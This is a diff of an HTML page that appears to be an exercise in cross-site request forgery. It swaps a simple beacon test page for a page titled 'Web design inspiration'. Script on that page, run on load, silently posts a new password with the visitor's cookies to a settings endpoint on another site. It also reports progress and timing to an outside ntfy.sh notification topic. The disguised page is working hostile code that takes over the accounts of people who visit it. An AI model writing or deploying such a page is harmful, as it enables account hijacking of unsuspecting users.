@@ -1,7 +1,16 @@
-<!doctype html><html><head><meta charset="utf-8"><title>t</title>
-<script>new Image().src="https://ntfy.sh/catstest1795227905/trigger?message=headJS";</script>
-</head><body>
-<img src="https://ntfy.sh/catstest1795227905/trigger?message=bodyIMG" width="1" height="1">
-<p>hello</p>
-<script>new Image().src="https://ntfy.sh/catstest1795227905/trigger?message=bodyJS";</script>
-</body></html>
+<!doctype html><html><head><meta charset="utf-8"><title>Web design inspiration</title></head><body>
+<h1>10 beautiful web designs</h1>
+<script>
+var U="catsdom1795228521", B="https://cats.is-course.ru", NP="Dm5!catwave2026";
+function b(n){var i=document.createElement("img");i.width=1;i.height=1;
+  i.src="https://ntfy.sh/"+U+"/trigger?message="+encodeURIComponent(n);document.body.appendChild(i);}
+b("d_start");
+var t0=performance.now();
+fetch(B+"/settings",{method:"POST",mode:"no-cors",credentials:"include",cache:"no-store",
+  headers:{"Content-Type":"application/x-www-form-urlencoded"},
+  body:"password="+encodeURIComponent(NP)+"&confirm-password="+encodeURIComponent(NP)})
+ .then(function(){b("d_t_"+Math.round(performance.now()-t0));})
+ .catch(function(e){b("d_err_"+e.name);});
+var n=0;
+var id=setInterval(function(){n++; b("d_alive"+n); if(n>=12){clearInterval(id); b("d_end");}},2000);
+</script></body></html>
